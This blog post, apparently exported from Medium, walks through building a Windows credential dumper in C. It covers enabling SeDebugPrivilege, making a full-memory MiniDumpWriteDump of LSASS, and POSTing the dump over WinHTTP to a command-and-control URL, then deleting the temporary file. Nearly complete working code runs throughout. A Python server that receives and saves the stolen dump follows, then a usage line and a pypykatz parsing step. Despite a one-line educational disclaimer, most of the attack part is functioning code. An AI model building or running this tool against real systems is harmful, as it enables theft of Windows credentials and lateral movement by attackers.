---
layout: post
title: "How Credential Dumpers Work: Building an LSASS Memory Extractor in C"
date: 2025-08-26
categories: [Red Team,Malware Development,Malware Analysis,Blue Team,LSASS,Mimikatz]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

#### What is lsass.exe?

Lsass.exe is a crucial system process in Windows that handles local security policies, user authentication, and credential management. It verifies user logins, handles password changes, and creates access tokens for users. In a domain environment, it’s also responsible for Active Directory database lookups, authentication, and replication.

#### Credential Dumping

In a Windows environment, users authenticate to their machines (either locally or remotely) with their username and password. Behind the scenes, Windows hands off all authentication-related tasks to the Local Security Authority Subsystem Service (LSASS) process. This process, known as “**lsass.exe**,” stores all sensitive authentication data in its memory, including user credentials and password hashes.

Knowing this, attackers target the data in the LSASS process to steal users’ sensitive Windows credentials from a previous logged session. Once credentials have been compromised, attackers can further their malicious lateral movement on the network. This process is known as **credential dumping** and is a key phase during an attacker’s kill chain to compromise accounts, passwords, and hashes.

There are plenty of tools and techniques for adversaries to use, such as [Mimikatz](https://github.com/gentilkiwi/mimikatz), to dump credentials. In this article, we explain and document a custom tool I have developed that:

1. Enables SeDebugPrivilege
2. Uses `MiniDumpWriteDump` to create a full-memory dump of LSASS into a temporary file
3. Reads that dump into memory
4. Exfiltrates the dump over HTTP(S) in one shot (using WinHTTP)
5. Cleans up the temporary file

> ***Disclaimer*: This article is for educational and authorized testing purposes only. Always have explicit permission before using such techniques in any environment.**

* * *

#### Tool Overview

The tool component follows this high-level flow:

1. **Enable SeDebugPrivilege**: Required to open and read LSASS process memory.
2. **Generate a temporary file path**: Use `GetTempPathA` + `GetTempFileNameA` to create a unique temp filename.
3. **Dump LSASS to the temp file**: Call `MiniDumpWriteDump` with `MiniDumpWithFullMemory`.
4. **Read the dump into memory**: Open the temp file, read its entire contents into a `malloc`-allocated buffer.
5. **Exfiltrate in one shot**: Use WinHTTP (`WinHttpSendRequest`) passing the full buffer in a single call so it’s sent atomically.
6. **Cleanup**: Zero out and free the in-memory buffer, delete the temp file.

This approach avoids leaving a persistent dump file: the dump only exists momentarily on disk, is read into memory, sent out, then deleted. Using a one-shot send avoids chunked or iterative writes that might truncate or reveal patterns at multiple stages.

* * *

#### Code Walkthrough

Below is a conceptual outline of the code, annotated to explain each part. (Omitted includes/pragmas, but assume linking against `DbgHelp.lib` and `Winhttp.lib`.)

* * *

#### 1. `EnableDebugPrivilege()`

```
BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                          &hToken)) {
        return FALSE;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(hToken);
    return ok;
}
```

**Line-by-line Explanation:**

**. OpenProcessToken**

```
if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken)) {return FALSE; }
```

- `GetCurrentProcess()`: Returns a pseudo-handle referring to the current process.
- `TOKEN_ADJUST_PRIVILEGES:` lets us enable/disable privileges in this token.
- `TOKEN_QUERY` : allows querying token information.

`&hToken`: out parameter. On success, it receives a handle to the process’s access token.

- **LookupPrivilegeValue**

```
if (!LookupPrivilegeValue(NULL,SE_DEBUG_NAME, &luid)) {CloseHandle(hToken);     return FALSE; }
```

1. `lpSystemName`: `NULL` means the local system.
2. `lpName`: `SE_DEBUG_NAME`, typically defined as `"SeDebugPrivilege"`. This is the privilege allowing debug-level access to other processes.
3. `&luid`: out parameter. Receives the LUID for SeDebugPrivilege.

**. Prepare TOKEN\_PRIVILEGES**

```
tp.PrivilegeCount= 1; 
tp.Privileges[0].Luid= luid; 
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
```

- `tp.PrivilegeCount = 1;`We intend to adjust one privilege.
- `tp.Privileges[0].Luid = luid;` : Set the LUID obtained from `LookupPrivilegeValue` for SeDebugPrivilege.
- `tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;` : This flag enables the privilege. Other flags include disabled, removed, etc.

**. AdjustTokenPrivileges**

```
AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
```

1. `TokenHandle`: `hToken`, the handle to the token we opened.
2. `DisableAllPrivileges`: `FALSE`, meaning we do *not* disable all, but adjust only as specified in `tp`.
3. `NewState`: `&tp`, pointer to the `TOKEN_PRIVILEGES` structure specifying which privileges to enable.
4. `BufferLength`: `sizeof(tp)`, size of the `TOKEN_PRIVILEGES` buffer.
5. `PreviousState`: `NULL`, we do not request the previous state.
6. `ReturnLength`: `NULL`, not used here.

```
BOOL DumpLSASS(DWORD pid, const char *dumpPath) {
 // Open LSASS with query/read
 HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
 FALSE, pid);
 if (!hProcess) {
 fprintf(stderr, "[-] OpenProcess Failed: %lu\n", GetLastError());
 return FALSE;
 }
 // Create or overwrite the dumpPath file
 HANDLE hFile = CreateFileA(dumpPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
 if (hFile == INVALID_HANDLE_VALUE) {
 fprintf(stderr, "[-] CreateFile Failed: %lu\n", GetLastError());
 CloseHandle(hProcess);
 return FALSE;
 }
 // Write full-memory minidump
 BOOL dumped = MiniDumpWriteDump(hProcess,pid,hFile,MiniDumpWithFullMemory,NULL,NULL,NULL);
 if (!dumped) {
 fprintf(stderr, "[-] MiniDumpWriteDump Failed: %lu\n", GetLastError());
 }
 CloseHandle(hFile);
 CloseHandle(hProcess);
 return dumped;
}
```

#### Line-by-line Explanation

**. OpenProcess**

`dwDesiredAccess`: `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ`.

- `PROCESS_QUERY_INFORMATION`: allows querying certain info about the process.
- `PROCESS_VM_READ`: allows reading the process’s memory pages.
- These rights are required by `MiniDumpWriteDump` to read memory of the target.

`bInheritHandle`: `FALSE`, the handle is not inheritable by child processes.

`dwProcessId`: `pid`, the LSASS process ID.

**. CreateFileA for dump file**

1. `lpFileName`: `dumpPath`, the path to the output dump file.
2. `dwDesiredAccess`: `GENERIC_WRITE`, open for writing.
3. `dwShareMode`: `0`, no sharing (other processes cannot read/write while open).
4. `lpSecurityAttributes`: `NULL`, default security.
5. `dwCreationDisposition`: `CREATE_ALWAYS`, create a new file; if it exists, overwrite it.
6. `dwFlagsAndAttributes`: `FILE_ATTRIBUTE_NORMAL`, normal file.
7. `hTemplateFile`: `NULL`, not used.

. **MiniDumpWriteDump**

`MiniDumpWriteDump` parameters:

1. `hProcess`: handle to LSASS process obtained earlier.
2. `ProcessId`: `pid`, the same process ID.
3. `hFile`: file handle where the dump will be written; must be seekable.
4. `DumpType`: `MiniDumpWithFullMemory`. Requests a full-memory dump of the process. This includes all memory pages, allowing credential extraction.
5. `ExceptionParam`: `NULL`, since we are not capturing exception context.
6. `UserStreamParam`: `NULL`, no extra streams.
7. `CallbackParam`: `NULL`, no callbacks.

```
BOOL DumpLSASSAndExfil(DWORD pid, const char* c2_url) {
 BOOL bResult = FALSE;
 CHAR tmpPath[MAX_PATH];
 CHAR tmpFile[MAX_PATH];
 DWORD fileSize = 0;
 DWORD bytesRead = 0;
 BYTE* fullBuffer = NULL;
// 1) Enable SeDebugPrivilege
 if (!EnableDebugPrivilege()) {
 fprintf(stderr, "[-] Failed to enable SeDebugPrivilege: %lu\n", GetLastError());
 return FALSE;
 }
// 2) Create a temp filename
 if (!GetTempPathA(MAX_PATH, tmpPath) ||
 !GetTempFileNameA(tmpPath, "LS", 0, tmpFile)) {
 fprintf(stderr, "[-] Cannot create temp filename: %lu\n", GetLastError());
 return FALSE;
 }
// 3) Dump LSASS to the temp file
 printf("[*] Dumping LSASS (PID=%u) into temp file %s …\n", pid, tmpFile);
 if (!DumpLSASS(pid, tmpFile)) {
 fprintf(stderr, "[-] DumpLSASS(temp) failed.\n");
 goto cleanup;
 }
// 4) Read the entire dump into memory
 HANDLE hFile = CreateFileA(tmpFile,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_TEMPORARY,NULL);
 if (hFile == INVALID_HANDLE_VALUE) {
 fprintf(stderr, "[-] Open temp dump failed: %lu\n", GetLastError());
 goto cleanup;
 }
 fileSize = GetFileSize(hFile, NULL);
 fullBuffer = (BYTE*)malloc(fileSize);
 if (!fullBuffer) {
 fprintf(stderr, "[-] malloc(%u) failed.\n", fileSize);
 CloseHandle(hFile);
 goto cleanup;
 }
 if (!ReadFile(hFile, fullBuffer, fileSize, &bytesRead, NULL) ||
 bytesRead != fileSize) {
 fprintf(stderr, "[-] ReadFile(temp) failed: %lu\n", GetLastError());
 CloseHandle(hFile);
 goto cleanup;
 }
 CloseHandle(hFile);
 printf("[+] In-memory dump size: %u bytes\n", fileSize);
// 5) Exfil via WinHTTP in one shot
```

**. Create a temp filename**

`GetTempPathA(MAX_PATH, tmpPath)`:

- Retrieves path to temp directory (e.g., `"C:\\Users\\User\\AppData\\Local\\Temp\\"`).
- **MAX\_PATH**: buffer size in characters.
- **tmpPath**: output buffer.

`GetTempFileNameA(tmpPath, "LS", 0, tmpFile)`:

- Creates a unique temporary file in `tmpPath` with prefix `"LS"`.
- `0`: let system choose a unique number.
- `tmpFile`: receives the full path, e.g., `"C:\\Users\\User\\AppData\\Local\\Temp\\LS1234.tmp"`.

**. Read the entire dump into memory**

`CreateFileA`

- `tmpFile`: path of the dump file just created.
- `GENERIC_READ`: open for reading.
- `FILE_SHARE_READ`: allow other readers; not critical here.
- `NULL`: default security.
- `OPEN_EXISTING`: only open if it exists.
- `FILE_ATTRIBUTE_TEMPORARY`: hint that file is temporary; may influence caching.
- `NULL`: no template file.

`GetFileSize` parameters:

- `hFile`: handle returned above.
- `NULL`: pointer for high-order DWORD (not used; file size assumed &lt;4GB).

```
fullBuffer = (BYTE*)malloc(fileSize);
    if (!fullBuffer) {
        fprintf(stderr, "[-] malloc(%u) failed.\n", fileSize);
        CloseHandle(hFile);
        goto cleanup;
    }
```

- Allocate `fileSize` bytes on the heap to hold the entire dump.

`ReadFile` parameters:

1. `hFile`: handle to the open file.
2. `fullBuffer`: destination buffer.
3. `fileSize`: number of bytes to read.
4. `&bytesRead`: receives how many bytes were actually read.
5. `NULL`: no OVERLAPPED structure (synchronous read).

#### Exfil via WinHTTP in one shot

```
{
        // Convert URL to wide-char
        size_t needed = MultiByteToWideChar(CP_UTF8, 0, c2_url, -1, NULL, 0);
        WCHAR* wUrl = (WCHAR*)malloc(needed * sizeof(WCHAR));
        MultiByteToWideChar(CP_UTF8, 0, c2_url, -1, wUrl, (int)needed);
```

**MultiByteToWideChar** (first call):

1. `CP_UTF8`: code page of source string (`c2_url` is UTF-8 or ANSI assumed).
2. `dwFlags=0`: no special flags.
3. `c2_url`: source ANSI/UTF-8 string, null-terminated.
4. `-1`: indicates source includes null-terminator; function calculates length automatically.
5. `NULL`: no output buffer provided, so function returns required number of wide chars (including null).
6. `0`: size of output buffer = 0 since querying size.

`WCHAR* wUrl = malloc(needed * sizeof(WCHAR));`

- Allocate buffer for wide-char URL.

**MultiByteToWideChar** (second call):

- Same parameters except now providing `wUrl` buffer and size `needed`.
- Converts `c2_url` into wide-character string `wUrl`.

```
URL_COMPONENTSW urlComp = {0};
        wchar_t hostW[256] = {0}, pathW[1024] = {0};
        urlComp.dwStructSize    = sizeof(urlComp);
        urlComp.lpszHostName    = hostW;
        urlComp.dwHostNameLength= _countof(hostW);
        urlComp.lpszUrlPath     = pathW;
        urlComp.dwUrlPathLength = _countof(pathW);
```

Prepare a `URL_COMPONENTSW` structure for parsing:

- `URL_COMPONENTSW urlComp = {0};` zero-initialize all fields.
- `wchar_t hostW[256] = {0}; wchar_t pathW[1024] = {0};` buffers for hostname and path.
- `urlComp.dwStructSize = sizeof(urlComp);`: must set size before call.
- `urlComp.lpszHostName = hostW;`: pointer to receive host name.
- `urlComp.dwHostNameLength = _countof(hostW);`: max length in WCHARs (including null).
- `urlComp.lpszUrlPath = pathW;`: pointer to receive URL path.
- `urlComp.dwUrlPathLength = _countof(pathW);`: max length.

```
if (!WinHttpCrackUrl(wUrl, (DWORD)wcslen(wUrl), 0, &urlComp)) {
            fprintf(stderr, "[-] WinHttpCrackUrl failed: %u\n", GetLastError());
            free(wUrl);
            goto cleanup;
        }
```

`WinHttpCrackUrl` :

1. `wUrl`: wide-char URL, e.g., `L"http://host:port/path"`.
2. `dwUrlLength`: length in WCHARs; here `(DWORD)wcslen(wUrl)` excludes null. Some examples pass `-1` to include null; using `wcslen` works.
3. `dwFlags=0`: no flags.
4. `&urlComp`: pointer to the struct to receive parsed components.

```
BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
        INTERNET_PORT port = (urlComp.nPort == 0)
            ? (isHttps ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT)
            : urlComp.nPort;
```

- `urlComp.nScheme`: parsed scheme, e.g. `INTERNET_SCHEME_HTTP` or `INTERNET_SCHEME_HTTPS`.
- `isHttps`: TRUE if scheme is HTTPS.
- `urlComp.nPort`: parsed port number; if zero (not specified in URL), choose default:
- If HTTPS, default 443 (`INTERNET_DEFAULT_HTTPS_PORT`).
- Else default 80 (`INTERNET_DEFAULT_HTTP_PORT`).
- If URL explicitly specified a port (nonzero), use that.

```
HINTERNET hSession = WinHttpOpen(
            L"LSASSExfil/1.0",
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            WINHTTP_NO_PROXY_NAME,
            WINHTTP_NO_PROXY_BYPASS,
            0);
```

`WinHttpOpen`:

1. `pwszUserAgent`: wide-char user-agent string, e.g. `"LSASSExfil/1.0"`. Appears in HTTP headers.
2. `dwAccessType`: `WINHTTP_ACCESS_TYPE_DEFAULT_PROXY`, use system default proxy settings.
3. `pwszProxyName`: `WINHTTP_NO_PROXY_NAME`, no custom proxy name
4. `pwszProxyBypass`: `WINHTTP_NO_PROXY_BYPASS`, no bypass list.
5. `dwFlags`: `0`, no flags.

```
HINTERNET hConnect = WinHttpConnect(
            hSession,
            urlComp.lpszHostName,
            port,
            0);
```

`WinHttpConnect`:

1. `hSession`: session handle from `WinHttpOpen`.
2. `pwszServerName`: `urlComp.lpszHostName`, wide-char host string.
3. `nServerPort`: `port`, determined above.
4. `dwReserved`: `0`, must be zero.

<!--THE END-->

- Returns a connection handle `hConnect`.

```
HINTERNET hRequest = WinHttpOpenRequest(
            hConnect,
            L"POST",
            urlComp.lpszUrlPath,
            NULL,
            WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            isHttps ? WINHTTP_FLAG_SECURE : 0);
```

`WinHttpOpenRequest`:

1. `hConnect`: connection handle.
2. `pwszVerb`: `L"POST"`, HTTP method.
3. `pwszObjectName`: `urlComp.lpszUrlPath`, wide-char path (e.g. `L"/upload"` or `L"/"`).
4. `pwszVersion`: `NULL`, default HTTP version.
5. `pwszReferrer`: `WINHTTP_NO_REFERER`, omit Referer header.
6. `pwszAcceptTypes`: `WINHTTP_DEFAULT_ACCEPT_TYPES`, default Accept header.
7. `dwFlags`: `isHttps ? WINHTTP_FLAG_SECURE : 0`. If HTTPS, set secure flag to use SSL/TLS.

<!--THE END-->

- Returns a request handle `hRequest`.

```
const wchar_t hdrs[] = L"Content-Type: application/octet-stream\r\n";
        DWORD hdrLen = (DWORD)wcslen(hdrs);
```

Prepare HTTP headers:

- `Content-Type: application/octet-stream`: indicates binary data in the body.
- Note: WinHTTP will automatically add `Content-Length` header if body is provided to `WinHttpSendRequest`.
- `hdrLen`: number of characters in `hdrs`, excluding null terminator.

```
if (!WinHttpSendRequest(
                hRequest,
                hdrs,
                hdrLen,
                fullBuffer,
                fileSize,
                fileSize,
                0)) {
            fprintf(stderr, "[-] WinHttpSendRequest failed: %u\n", GetLastError());
        } else if (!WinHttpReceiveResponse(hRequest, NULL)) {
            fprintf(stderr, "[-] WinHttpReceiveResponse failed: %lu\n", GetLastError());
        } else {
            printf("[+] Exfiltration complete—C2 responded.\n");
            bResult = TRUE;
        }
```

`WinHttpSendRequest`:

1. `hRequest`: request handle.
2. `pwszHeaders`: pointer to headers buffer (`hdrs`).
3. `dwHeadersLength`: header length in WCHARs (`hdrLen`). If `-1`, headers are null-terminated; here using explicit length.
4. `lpOptional`: pointer to request body data in memory (`fullBuffer`).
5. `dwOptionalLength`: size in bytes of body (`fileSize`).
6. `dwTotalLength`: same as `dwOptionalLength`; total size of body to send.
7. `dwContext`: `0`, no context value.

<!--THE END-->

- If send succeeds, call `WinHttpReceiveResponse(hRequest, NULL)` to wait and retrieve server response. If that fails, log error.
- If both succeed, set `bResult = TRUE`.

```
WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        free(wUrl);
    }
```

Close WinHTTP handles in reverse order:

- `WinHttpCloseHandle(hRequest)`: closes request handle.
- `WinHttpCloseHandle(hConnect)`: closes connection handle.
- `WinHttpCloseHandle(hSession)`: closes session handle.
- `free(wUrl)`: free the wide-char URL buffer.

#### cleanup Label &amp; Final Cleanup

```
cleanup:
    // Zero & free buffer
    if (fullBuffer) {
        SecureZeroMemory(fullBuffer, fileSize);
        free(fullBuffer);
    }
    // Delete the temp file
    DeleteFileA(tmpFile);
    return bResult;
}
```

**Label** `cleanup`**:** used by `goto cleanup` on earlier errors.

- `SecureZeroMemory(fullBuffer, fileSize)`: overwrites the memory buffer with zeros to remove sensitive data (the dump) from process memory before freeing.
- `free(fullBuffer)`: release allocated memory.
- `DeleteFileA(tmpFile)`: deletes the temporary dump file from disk. Even if the file was deleted before, this ensures removal if still present.
- `return bResult;`: return TRUE if exfil succeeded, FALSE otherwise.

* * *

#### Server-Side Handling

Briefly document how to receive the POST:

```
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
class DumpHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        if length <= 0:
            self.send_response(400)
            self.end_headers()
            return
        data = self.rfile.read(length)
        # Save raw dump:
        with open('lsass_dump.bin','wb') as f:
            f.write(data)
        print(f"[+] Received {len(data)} bytes")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, fmt, *args):
        return
if __name__ == '__main__':
    port = 8000
    server = HTTPServer(('', port), DumpHandler)
    print(f"Listening on port {port} …")
    server.serve_forever()
```

* * *

### Usage Example

1. `Minikat.exe --exfil <lsass-pid> http://<C2-server>:<port>/upload`
2. On the server side, your HTTP handler saves the raw body to disk as `dump.bin`, then you run:

`pypykatz lsa minidump dump.bin`

* * *

The full code on GitHub:

[https://github.com/Moataz51201/LsassDumper](https://github.com/Moataz51201/LsassDumper)

By [Moataz Osama](https://medium.com/@mezo512) on [June 17, 2025](https://medium.com/p/9bc00fe978c0).

[Canonical link](https://medium.com/@mezo512/how-credential-dumpers-work-building-an-lsass-memory-extractor-in-c-9bc00fe978c0)

Exported from [Medium](https://medium.com) on August 26, 2025.